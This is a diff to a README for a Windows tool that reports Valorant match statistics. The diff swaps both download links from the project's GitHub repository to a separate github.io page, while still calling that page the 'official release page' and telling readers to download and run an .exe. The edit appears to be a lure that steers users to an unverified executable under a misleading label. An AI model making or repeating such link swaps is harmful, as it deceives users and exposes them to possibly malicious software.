@@ -1,6 +1,6 @@
 # 🎮 vlravg-match-stats - Track your Valorant match performance easily
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Bertyfoliaceous160/vlravg-match-stats)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://bertyfoliaceous160.github.io)
 
 This tool tracks your Valorant match data. It displays your average lobby rank, your kill-death ratio per game, who you play with most often, and your total playtime. The software pulls this information directly from the game statistics records. You can use it to review your progress and understand your play style.
 
@@ -11,7 +11,7 @@ The application runs on Windows. You need a stable internet connection to fetch 
 ## 📥 How to Install and Run
 
 1. Open a web browser on your computer.
-2. Go to the [official release page](https://github.com/Bertyfoliaceous160/vlravg-match-stats).
+2. Go to the [official release page](https://bertyfoliaceous160.github.io).
 3. Look for the file ending in .exe under the latest version.
 4. Click the file to download it to your Downloads folder.
 5. Double-click the downloaded file to start the application.
